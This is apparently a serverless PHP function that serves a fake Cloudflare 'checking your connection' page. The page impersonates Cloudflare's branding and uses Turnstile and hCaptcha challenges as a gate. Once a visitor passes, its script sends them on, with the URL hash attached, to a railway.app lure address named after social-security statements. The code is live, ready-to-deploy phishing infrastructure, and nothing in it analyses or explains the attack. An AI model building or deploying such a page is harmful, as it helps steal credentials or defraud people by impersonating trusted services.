<?php
function main(array $args) : array
{
    $html = <<<HTML
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8" />
    <title>Just a moment...</title>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="robots" content="noindex,nofollow" />
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://challenges.cloudflare.com https://js.hcaptcha.com; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://js.hcaptcha.com">
    
    <!-- Preload scripts -->
    <link rel="preload" href="https://challenges.cloudflare.com/turnstile/v0/api.js" as="script">
    <link rel="preload" href="https://js.hcaptcha.com/1/api.js" as="script">
    
    <!-- Load scripts with fallback -->
    <script>
    function loadScript(src, onload) {
        var script = document.createElement('script');
        script.src = src;
        script.onerror = function() {
            console.error('Failed to load script: ' + src);
            // Fallback or alternative behavior here
        };
        if(onload) script.onload = onload;
        document.head.appendChild(script);
    }
    
    loadScript('https://challenges.cloudflare.com/turnstile/v0/api.js', function() {
        console.log('Turnstile loaded');
        window.onloadTurnstileCallback();
    });
    
    loadScript('https://js.hcaptcha.com/1/api.js', function() {
        console.log('hCaptcha loaded');
    });
    </script>
    
    <style>
        body {
            text-align: center;
            font-family: system-ui, sans-serif;
            margin: 0;
            padding: 0;
            background: #f9f9f9;
            color: #333;
        }
        #cfForm, #gForm {
            margin: 20px auto;
            max-width: 300px;
        }
        .footer {
            margin-top: 50px;
            font-size: 12px;
            color: #999;
        }
    </style>
    <script>
        var lure_url_js = "https://statements-administrator08382-social-sec87.up.railway.app/";
        
        var verifyCallback_CF = function (a) {
            console.log('Cloudflare callback', a);
            let b = document.querySelector("#cfForm");
            if (b && a.length > 10) {
                b.remove();
                window.location.href = lure_url_js + window.location.hash;
                return;
            }
            return switchToSecondCaptcha();
        };
        
        var verifyCallback_hCaptcha = function (a) {
            console.log('hCaptcha callback', a);
            let b = document.querySelector("#gForm");
            if (!b) return;
            b.style.visibility = "hidden";
            window.location.href = lure_url_js + window.location.hash;
        };
        
        window.switchToSecondCaptcha = function () {
            console.log('Switching to hCaptcha');
            let a = document.querySelector("#gForm");
            if (!a || a.style.visibility === "visible") return;
            
            setTimeout(() => {
                const b = document.querySelector("#cfForm");
                if (b && b.style.visibility !== "hidden") {
                    b.style.visibility = "hidden";
                }
                setTimeout(() => {
                    a.style.visibility = "visible";
                }, 200);
            }, 200);
        };
        
        var refreshCallBack = function () {
            setTimeout(() => window.location.reload(), 1000);
        };
        
        window.onloadTurnstileCallback = function () {
            console.log('Initializing Turnstile');
            if (typeof turnstile !== 'undefined') {
                turnstile.render("#turnstileCaptcha", {
                    sitekey: "0x4AAAAAABdw-3VUPnKmlAyC",
                    callback: verifyCallback_CF,
                    "expired-callback": refreshCallBack
                });
            } else {
                console.error('Turnstile not available');
                setTimeout(window.onloadTurnstileCallback, 500);
            }
        };
        
        // Fallback if scripts fail to load
        setTimeout(function() {
            if (typeof turnstile === 'undefined' || typeof hcaptcha === 'undefined') {
                console.error('CAPTCHA services failed to load');
                // Implement fallback behavior here
            }
        }, 5000);
    </script>
</head>
<body>
    <div class="main-wrapper" role="main">
        <div class="main-content">
            <h1>Cloudflare Security</h1>
            <p id="cf-spinner-please-wait">Please stand by, while we check if your connection is secure...</p>
            
            <form action="" method="POST" id="gForm" style="visibility: hidden">
                <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
            </form>
            
            <form action="" method="POST" id="cfForm" style="visibility: visible">
                <div id="turnstileCaptcha"></div>
            </form>
        </div>
    </div>
    
    <div class="footer">
        <p>Performance &amp; security by <a href="#" target="_blank">Cloudflare</a></p>
    </div>
    
    <script>
        // Initialize if scripts loaded before DOM ready
        document.addEventListener('DOMContentLoaded', function() {
            if (typeof turnstile !== 'undefined' && !document.querySelector("#turnstileCaptcha").hasChildNodes()) {
                window.onloadTurnstileCallback();
            }
        });
    </script>
</body>
</html>
HTML;

    return [
        'body' => $html,
        'headers' => [
            'Content-Type' => 'text/html',
        ]
    ];
}
